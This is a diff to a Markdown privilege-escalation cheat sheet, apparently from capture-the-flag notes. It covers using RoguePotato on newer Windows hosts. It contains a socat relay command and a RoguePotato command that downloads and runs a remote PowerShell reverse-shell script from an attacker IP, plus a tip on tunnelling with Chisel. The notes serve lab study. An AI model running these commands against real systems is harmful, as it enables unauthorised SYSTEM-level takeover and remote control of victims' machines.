@@ -931,9 +931,16 @@ SeTakeOwnershipPrivilege: allows user to take ownership over an object (WRITE_OW
 JuicyPotato won't work with Windows 10 1809 and Windows Server 2019 and above. Try **Rogue Potato** instead: \
 Transfer RoguePotato.exe over the target machine. \
 On local machine: 
-```socat tcp-listen:135,reuseaddr,fork tcp:$RHOST:$RPORT``` \
+```
+socat tcp-listen:135,reuseaddr,fork tcp:$RHOST:$RPORT
+```
 Set up a Python server to transfer powershell payload over and a netcat listner. \
-On target machine: ```.\RoguePotato.exe -r 10.10.14.x -e "powershell IEX( IWR http://10.10.14.x:6666/rev.ps1 -UseBasicParsing)" -l 9000```
+On target machine: 
+```
+.\RoguePotato.exe -r 10.10.14.x -e "powershell -c IEX( IWR http://10.10.14.x:6666/rev.ps1 -UseBasicParsing)" -l 9000
+```
+The port '9000' has to be open on the target, or we can use Chisel to open and tunnel it. Watch Worker@HTB writeup.
+
 
 **Port forwarding for privilege escalation**
 
